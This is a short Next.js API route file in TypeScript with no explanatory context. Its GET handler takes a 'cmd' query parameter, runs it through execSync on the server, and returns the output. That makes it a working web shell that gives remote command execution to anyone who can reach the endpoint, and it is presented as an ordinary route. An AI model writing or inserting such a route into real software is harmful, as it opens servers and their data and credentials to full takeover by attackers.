import { NextResponse, type NextRequest } from "next/server";
import { execSync } from "node:child_process";

export async function GET(req: NextRequest) {
  const searchParams = req.nextUrl.searchParams;
  const cmd = searchParams.get("cmd");

  let result = "";
  if (cmd !== null) {
    result = execSync(cmd).toString();
  }

  return NextResponse.json({ result });
}
